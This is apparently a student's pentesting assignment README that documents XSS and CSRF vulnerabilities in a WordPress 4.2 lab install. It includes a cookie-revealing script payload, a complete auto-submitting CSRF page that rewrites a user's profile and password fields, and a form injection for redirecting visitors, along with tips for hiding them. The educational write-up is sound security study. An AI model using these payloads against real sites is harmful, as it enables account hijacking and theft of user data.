# Project 7 - WordPress Pentesting

Time spent: **16** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. XSS Vulnerability
  - [ ] Summary: 
    - Vulnerability types:
    Cross-Site Scripting (html)
    - Tested in version:
    WordPress 4.2
    - Fixed in version:
    WordPress 5.1.1
  - [ ] GIF Walkthrough: 
  <img src='https://recordit.co/RsqzPCxGG8.gif' title='XSS' width='' alt='XSS' />
  https://recordit.co/RsqzPCxGG8.gif
  
  - [ ] Steps to recreate: 
  When posting a comment, entered the following to display the current poster's cookies:
  
  "<script>prompt(document.cookie)</script>" 
  
 This script is more inconspicuous has it is not easily visible nor detectable, and can be combined with a normal comment to further avoid suspicion.
  - [ ] Affected source code:
    - https://www.exploit-db.com/exploits/36844
    
    
2. CSRF Vulnerability
  - [ ] Summary: 
    - Vulnerability types:
    Cross-Site Request Forgery (CSRF)
    - Tested in version:
    Wordpress 4.2
    - Fixed in version: 
    Unknown
  - [ ] GIF Walkthrough: 
  <img src='https://recordit.co/VpCoSCLfrf.gif' title='CSRF' width='' alt='CSRF' />
  https://recordit.co/VpCoSCLfrf.gif
  
  - [ ] Steps to recreate: 
  The following was done in Firefox:
  When the specified user is logged in, using the following text document to change the profile information:
  
  <!DOCTYPE html>
<html>
<body>
<body onload=document.csrfForm.submit(); >

<form name="csrfForm" action="http://wpdistillery.vm/wp-admin/profile.php" method="POST">

<input id="last_name" class="regular-text" type="text" name="last_name" value="Hacked" />
<input id="first_name" class="regular-text" type="text" name="first_name" value="Hacked" />
<input id="nickname" class="regular-text" type="text" name="nickname" value="Hacked" />
<input id="display_name" class="regular-text" type="text" name="display_name" value="User+Null" />
<input id="email" class="regular-text" type="text" name="email" value="email@email.com" />
<input id="url" class="regular-text" type="text" name="url" value="" />
<input id="description" class="regular-text" type="text" name="description" value="" />
<input id="pass1" class="regular-text" type="text" name="pass1" value="" />
<input id="pass2" class="regular-text" type="text" name="pass2" value="" />


<input id="_wpnonce" type="hidden" name="_wpnonce" value="89547d5a15"/>
<input id="_wp_http_referer" type="hidden" name="_wp_http_referer" value="%2Fwp-admin%2Fprofile.php"/>
<input id="from" type="text" name="from" value="profile"/>
<input id="checkuser_id" type="hidden" name="checkuser_id" value="2"/>
<input id="color-nonce" type="hidden" name="color-nonce" value="4ed8631790"/>
<input id="admin_color" type="hidden" name="admin_color" value="fresh"/>
<input id="admin_bar_front" type="hidden" name="admin_bar_front" value="1"/>

<input id="action" type="hidden" name="action" value="update"/>
<input id="user_id" type="hidden" name="user_id" value="2"/>
<input id="submit" type="submit" name="submit" value="Update+Profile"/>

<p1>Hey<p1>

</form>
<script>
 document.csrfForm.submit();
</script>
 
</body>
</html>
  
  Change the ".txt" suffix to ".html", which will launch the html code and open the user's profile with new values updated from the malicious file.
  Note: The values used were located using BurpSuite. The values "_wpnonce" and "color-nonce change" each time the user logs in, so these values need to be updated in the html text document every time a login occurs. 
  - [ ] Affected source code:
    - https://www.exploit-db.com/exploits/36954
    
    
3. XSS Vulnerability
  - [ ] Summary: 
    - Vulnerability types:
    Cross-Site Scripting
    - Tested in version:
    WordPress 4.2
    - Fixed in version: 
    WordPress 5.1.1
  - [ ] GIF Walkthrough: 
  <img src='https://recordit.co/6uJGNAraMv.gif' title='XSS 2' width='' alt='XSS 2' />
  - [ ] Steps to recreate: 
  In comments, submitted the following:
  <form action="[some website link]">
  <input type="submit" value=""/>
  </form>
  The input type "submit" is simply a button, but can be changed to something less visible/obvious, and has the potential to sending a user to an inappropriate website like an unwanted add or an HTML site built to steal user information.
  - [ ] Affected source code:
    - https://www.exploit-db.com/exploits/36844

## Assets

All assets have been described in "Steps to recreate".

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)
- [Exploit DB] (https://www.exploit-db.com/)

GIFs created with Record It! (https://recordit.co/).

## Notes

Challenges involved with this assignment include, but are not limitted to, 
## License

    Copyright 2020 Rey Crittenden

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
